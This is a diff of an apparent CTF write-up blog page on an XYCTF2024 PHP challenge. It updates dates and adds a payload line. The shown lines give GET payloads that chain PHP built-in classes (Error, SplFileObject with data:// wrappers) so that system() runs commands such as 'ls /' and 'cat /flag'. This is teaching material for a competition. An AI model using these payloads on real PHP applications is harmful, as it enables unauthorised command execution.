@@ -38,7 +38,7 @@
 <meta property="og:image" content="http://example.com/image/achieve/202411/XYCTF2024/image-20250519150052097.png">
 <meta property="og:image" content="http://example.com/image/achieve/202411/XYCTF2024/image-20250519151308336.png">
 <meta property="article:published_time" content="2025-05-18T11:27:19.000Z">
-<meta property="article:modified_time" content="2025-05-19T07:18:06.998Z">
+<meta property="article:modified_time" content="2025-06-21T05:34:08.844Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="XYCTF2024">
 <meta name="twitter:card" content="summary">
@@ -171,7 +171,7 @@
       
         <time datetime="2025-05-18T11:27:19.000Z" class="dt-published" itemprop="datePublished">2025-05-18</time>
         
-        (Updated: <time datetime="2025-05-19T07:18:06.998Z" class="dt-updated" itemprop="dateModified">2025-05-19</time>)
+        (Updated: <time datetime="2025-06-21T05:34:08.844Z" class="dt-updated" itemprop="dateModified">2025-06-21</time>)
         
       
     </div>
@@ -520,7 +520,7 @@
 
 <p>所以基本思路就是创建两个error类分别给system和cat &#x2F;flag两个参数，再用getMessage方法把输进去的参数当作字符串返回</p>
 <p><img src="/../image/achieve/202411/XYCTF2024/image-20250402194903136.png" alt="image-20250402194903136"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=Error&amp;aa=system&amp;c=getMessage&amp;b=Error&amp;bb=ls /</span><br><span class="line">等价于</span><br><span class="line">((new Error(&#x27;system&#x27;))-&gt;getMessage())((new $Error(&#x27;ls /&#x27;))-&gt;getMessage());</span><br><span class="line">等价于</span><br><span class="line">system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=Error&amp;aa=system&amp;c=getMessage&amp;b=Error&amp;bb=ls /</span><br><span class="line">等价于</span><br><span class="line">((new Error(&#x27;system&#x27;))-&gt;getMessage())((new $Error(&#x27;ls /&#x27;))-&gt;getMessage());</span><br><span class="line">等价于</span><br><span class="line">system(&#x27;ls /&#x27;)</span><br><span class="line">?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,cat%20/flag</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../image/achieve/202411/XYCTF2024/image-20250402194428990.png" alt="image-20250402194428990"></p>
 <h2 id="SplFileObject内置类-data伪协议"><a href="#SplFileObject内置类-data伪协议" class="headerlink" title="#SplFileObject内置类+data伪协议"></a>#SplFileObject内置类+data伪协议</h2><p>也用SplFileObject内置类去打，我们先看看SplFileObjectp类中有什么内容</p>
